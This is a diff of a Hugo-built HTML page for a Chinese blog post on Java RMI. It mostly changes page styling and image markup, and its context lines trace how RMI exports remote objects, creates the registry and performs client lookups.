@@ -10,7 +10,7 @@
 <meta name="description" content="RMI基础及几种攻击方式">
 <meta name="author" content="">
 <link rel="canonical" href="http://localhost:1313/xvsf/posts/rmi/">
-<link crossorigin="anonymous" href="http://localhost:1313/xvsf/assets/css/stylesheet.ab85a69d0e175d64b699558fc812446c6a981a2468693407673825f0afe46af5.css" integrity="sha256-q4WmnQ4XXWS2mVWPyBJEbGqYGiRoaTQHZzgl8K/kavU=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="http://localhost:1313/xvsf/assets/css/stylesheet.a36f6abb64fcc226df8874b18c238ad3f6f524fd452ae18a758deedcc6db1f2c.css" integrity="sha256-o29qu2T8wibfiHSxjCOK0/b1JP1FKuGKdY3u3MbbHyw=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/xvsf/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
@@ -70,7 +70,8 @@
         document.querySelector("html").dataset.theme = 'light';
     }
 
-</script>
+</script><link rel="preload" href="http://localhost:1313/xvsf/fonts/inter-7.woff2" as="font" type="font/woff2" crossorigin>
+
 </head>
 <body id="top">
     <header class="header">
@@ -145,7 +146,7 @@
     <div class="post-description">
       RMI基础及几种攻击方式
     </div>
-    <div class="post-meta"><span title='2025-09-20 15:00:00 +0800 CST'>September 20, 2025</span>&nbsp;·&nbsp;<span>16 min</span>
+    <div class="post-meta"><span title='2025-09-20 15:00:00 +0800 CST'>September 20, 2025</span>&nbsp;·&nbsp;16 min&nbsp;·&nbsp;<a href="http://localhost:1313/xvsf/categories/java/">Java</a>
 
 </div>
   </header> <div class="toc">
@@ -256,7 +257,7 @@
 <p>缺点：调用过程很慢，而且该过程是不可靠的，容易发生不可预料的错误，比如网络错误等；</p>
 <p>在RMI中的核心是远程对象（remote object），除了对象本身所在的虚拟机，其他虚拟机也可以调用此对象的方法，而且这些虚拟机可以不在同一个主机上。每个远程对象都要实现一个或者多个远程接口来标识自己，声明了可以被外部系统或者应用调用的方法（当然也有一些方法是不想让人访问的）。</p>
 </blockquote>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png" style="max-width: 100%; height: auto;"></p>
 <h2 id="2rmi-基本实现">2、RMI 基本实现<a hidden class="anchor" aria-hidden="true" href="#2rmi-基本实现">#</a></h2>
 <h3 id="客户端">客户端<a hidden class="anchor" aria-hidden="true" href="#客户端">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
@@ -329,40 +330,40 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>RMI 客户端通过远程调用服务端的 sayHello 方法，成功在服务端输出了大写的“HELLO”。</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png" style="max-width: 100%; height: auto;"></p>
 <h2 id="3流程原理">3、流程原理<a hidden class="anchor" aria-hidden="true" href="#3流程原理">#</a></h2>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png" style="max-width: 100%; height: auto;"></p>
 <h3 id="31-服务端-创建远程服务">3.1 服务端-创建远程服务<a hidden class="anchor" aria-hidden="true" href="#31-服务端-创建远程服务">#</a></h3>
 <p>调试分析远程对象的创建过程：</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png" style="max-width: 100%; height: auto;"></p>
 <p>进入其构造函数，</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png" style="max-width: 100%; height: auto;"></p>
 <p>**UnicastRemoteObject **中 ，port 被默认赋值为 0</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png" style="max-width: 100%; height: auto;"></p>
 <p>步入  UnicastRemoteObject  类中的 <strong>exportObject</strong> （姑且称为导出对象函数）</p>
 <ul>
 <li><!-- raw HTML omitted -->public static<!-- raw HTML omitted -->：不需要创建 UnicastRemoteObject  实例也可以调用
 <ul>
-<li><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png"></li>
+<li><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png" style="max-width: 100%; height: auto;"></li>
 </ul>
 </li>
 <li>Remote obj：实现了 java.rmi.Remote 接口的对象，</li>
 <li>int port： 接收客户端的请求</li>
 </ul>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png" style="max-width: 100%; height: auto;"></p>
 <p>接下进入 return exportObject(obj, new UnicastServerRef(port)); 中的  <!-- raw HTML omitted -->new UnicastServerRef(port))，<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->UnicastServerRef<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->（称之为服务端引用）<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->var 1 这里是端口号 port ，传入 port 后，调用 父类构造函数 <!-- raw HTML omitted --><strong><!-- raw HTML omitted -->LiveRef<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->,<!-- raw HTML omitted --></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png" style="max-width: 100%; height: auto;"></p>
 <p>来到 LiveRef 的构造函数</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png" style="max-width: 100%; height: auto;"></p>
 <p>这里可以看一下 getLocalEndpoint</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png" style="max-width: 100%; height: auto;"></p>
 <p>这里的 <strong>TCPEndpoint</strong> 用于远程通信，其构造函数中的变量 String var1 为 host (ip) 、int var2 为 port (端口)</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png" style="max-width: 100%; height: auto;"></p>
 <p>继续跟入 <!-- raw HTML omitted -->this(var1, TCPEndpoint.getLocalEndpoint(var2), true); 中的 <!-- raw HTML omitted -->this，在此处 ep 中有了IP和端口信息</p>
 <ul>
 <li>Endpoint ep    端点信息（IP、端口、socket）</li>
@@ -370,29 +371,29 @@
 <li>isLoacl    是否为本地对象</li>
 </ul>
 <p>然后这些信息都被存放在 LiveRef 中。</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png" style="max-width: 100%; height: auto;"></p>
 <p>接下来又调用了父类方法并将 ref 赋值为 var1（var1:<strong>LiveRef@626</strong>）</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png" style="max-width: 100%; height: auto;"></p>
 <p>接下来回到  <!-- raw HTML omitted -->return exportObject(obj, new UnicastServerRef(port)); 中的  exportObject 方法<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->首先判断了 obj 是否继承了 UnicastRemoteObject ，如果没有继承那么就把 ref 设置为 sref。<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->之后都使用 sref.exportObject 进行工作完成导出远程对象的操作<!-- raw HTML omitted --></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png" style="max-width: 100%; height: auto;"></p>
 <p>而 sref 中封装着 LiveRef@626</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png" style="max-width: 100%; height: auto;"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><strong><!-- raw HTML omitted -->sref.exportObject <!-- raw HTML omitted --></strong> 的执行过程：</p>
 <p><code>stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</code>这一步是创建<strong>客户端代理</strong>的过程。</p>
 <blockquote>
 <p>（为什么要在服务端创建客户端代理呢？）</p>
 <p>这里通过流程图解释：服务端首先创建好 Remote Stub 放到注册中心，客户端通过注册中心拿到 Remote Stub，客户端通过 Remote Stub 调用另一个代理 Remote Skeleton ，之后 Remote Skeleton 调用服务端。</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png" style="max-width: 100%; height: auto;"></p>
 </blockquote>
 <p>步入 createProxy</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png" style="max-width: 100%; height: auto;"></p>
 <p>clientRef 中存放的就是那个核心 LiveRef@783 （上文是 LiveRef@626，核心都是相同的）</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png" style="max-width: 100%; height: auto;"></p>
 <p>此处进行了判断：</p>
 <ul>
 <li>forceStubUse：如果为 <code>true</code>，就强制使用旧的 <strong>静态 Stub 类</strong>（由 <code>rmic</code> 工具生成的 <code>_Stub.class</code>）这是为了兼容 JDK 1.1 时代的 RMI，这种情况直接调用 <code>createStub(...)</code> 去加载和实例化 Stub</li>
@@ -418,49 +419,49 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"> </span><span class="c1">//如果缓存里已有，或者加载失败，就返回 false</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>如果要进入 createStub ，<strong>强制使用 Stub</strong><code>forceStubUse == true</code>，<strong>没有忽略 Stub 并且存在 Stub 类</strong><code>ignoreStubClasses == false``stubClassExists(remoteClass) == true</code></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png" style="max-width: 100%; height: auto;"></p>
 <p>下一步创建动态代理</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png" style="max-width: 100%; height: auto;"></p>
 <p>其中的 handler 存放 LiveRef@783</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png" style="max-width: 100%; height: auto;"></p>
 <p>这样就创建好了动态代理 <strong>stub</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png" style="max-width: 100%; height: auto;"></p>
 <p>进入 Target （实际上是将目前创建的东西都封装到一起）</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png" style="max-width: 100%; height: auto;"></p>
 <p><strong>客户端引用（stub）和服务端引用（disp）的 LiveRef 是一样的，</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png" style="max-width: 100%; height: auto;"></p>
 <p>接下来，将封装好的 target 发布出去</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png" style="max-width: 100%; height: auto;"></p>
 <p>跟到了 TCPTransport 类中的 exportObject</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png" style="max-width: 100%; height: auto;"></p>
 <p>listen() 函数先获取 <strong>TCPEndpoint@823</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png" style="max-width: 100%; height: auto;"></p>
 <p>准备创建 ServerSocket</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png" style="max-width: 100%; height: auto;"></p>
 <p>判断 port 是否为 0，如果为 0 ，进入 setDefaultPort，设置端口号</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">listenPort</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">setDefaultPort</span><span class="p">(</span><span class="n">server</span><span class="p">.</span><span class="na">getLocalPort</span><span class="p">(),</span><span class="w"> </span><span class="n">csf</span><span class="p">,</span><span class="w"> </span><span class="n">ssf</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png"></p>
+</span></span></span></code></pre></div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png" style="max-width: 100%; height: auto;"></p>
 <p>进入 server.getLocalPort</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png" style="max-width: 100%; height: auto;"></p>
 <p>在这个函数中端口被赋值，此端口随机，</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png" style="max-width: 100%; height: auto;"></p>
 <p>这个时候的端口被赋值为 55685</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png" style="max-width: 100%; height: auto;"></p>
 <ul>
 <li>doPrivileged： 表示即使调用栈上其他代码没有权限，也允许这里的操作按本方法的权限执行。</li>
 <li>NewThreadAction： 创建一个新的线程</li>
 </ul>
 <p>这个线程开启之后等待客户端的连接</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png" style="max-width: 100%; height: auto;"></p>
 <p>做完这些之后，用 MAP 表储存 target，target 中包括了 IP、端口、服务端代理、客户端代理等信息</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png" style="max-width: 100%; height: auto;"></p>
 <p>最后返回一些值，完成了服务端的发布过程。</p>
 <p>到这里在返回看 <strong>exportObject 函数的作用</strong>：</p>
 <ul>
@@ -468,38 +469,38 @@
 <li><!-- raw HTML omitted -->重载方法的 exportObject 返回代理对象 stub<!-- raw HTML omitted --></li>
 <li>这样就做到了把一个本地的远程对象实例导出成一个可以远程访问的对象</li>
 </ul>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png" style="max-width: 100%; height: auto;"></p>
 <h3 id="32-注册中心-创建注册中心绑定">3.2 注册中心-创建注册中心+绑定<a hidden class="anchor" aria-hidden="true" href="#32-注册中心-创建注册中心绑定">#</a></h3>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png" style="max-width: 100%; height: auto;"></p>
 <p>调用 createRegistry  创建注册中心，默认端口号为1099</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png" style="max-width: 100%; height: auto;"></p>
 <p>到了这一步点“恢复程序”，如果继续跟进去会发现一堆奇怪的东西</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png" style="max-width: 100%; height: auto;"></p>
 <p>来到这一步：</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png" style="max-width: 100%; height: auto;"></p>
 <p>创建了一个 LiveRef，一个 lref，（这里的作用和服务端的实际上是一样的）</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png" style="max-width: 100%; height: auto;"></p>
 <h3 id="33-客户端-请求注册中心">3.3 客户端-请求注册中心<a hidden class="anchor" aria-hidden="true" href="#33-客户端-请求注册中心">#</a></h3>
 <p>首先连接注册中心，接收传入的IP和端口</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png" style="max-width: 100%; height: auto;"></p>
 <p>使用LIveRef ，将传入的 host,port,等封装</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png" style="max-width: 100%; height: auto;"></p>
 <p>再次调用 <!-- raw HTML omitted -->createProxy 方法，同样的创建了 stub ，（这里的创建是通过注册中心传入参数（host,port..），客户端自行创建 stub）<!-- raw HTML omitted --></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png" style="max-width: 100%; height: auto;"></p>
 <p>来到下一步：</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png" style="max-width: 100%; height: auto;"></p>
 <h4 id="问题在动态调试时遇到报错可能是服务端没有开启">问题：在动态调试时遇到报错，可能是服务端没有开启！<a hidden class="anchor" aria-hidden="true" href="#问题在动态调试时遇到报错可能是服务端没有开启">#</a></h4>
 <p>下一步调用会报以下错误，因为服务端没有开启监听</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png" style="max-width: 100%; height: auto;"></p>
 <p>将 RMIServer 运行起来就可以了</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png" style="max-width: 100%; height: auto;"></p>
 <p>这里看到传进来的 var1 实际上就是<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>中的 <code>remoteObj</code></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png"></p>
